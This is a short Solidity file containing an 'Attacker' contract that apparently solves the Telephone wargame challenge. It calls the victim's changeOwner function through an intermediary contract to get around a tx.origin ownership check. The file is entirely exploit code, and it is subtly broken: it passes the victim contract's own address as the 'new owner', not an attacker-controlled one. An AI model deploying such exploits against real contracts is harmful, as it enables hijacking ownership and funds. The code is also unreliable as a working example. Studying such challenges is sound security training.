// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {
    // The Telephone contract instance address
    address victim = address(0x8af4cE789946810C13684a2A2c1Ac7E27d179fC3);

    function callVictim() external returns (bool)
    {
        // Send the new owner address as a parameter.
        (bool success, ) = victim.call(abi.encodeWithSignature("changeOwner(address)", 0x8af4cE789946810C13684a2A2c1Ac7E27d179fC3));

        return success;
    }
  
}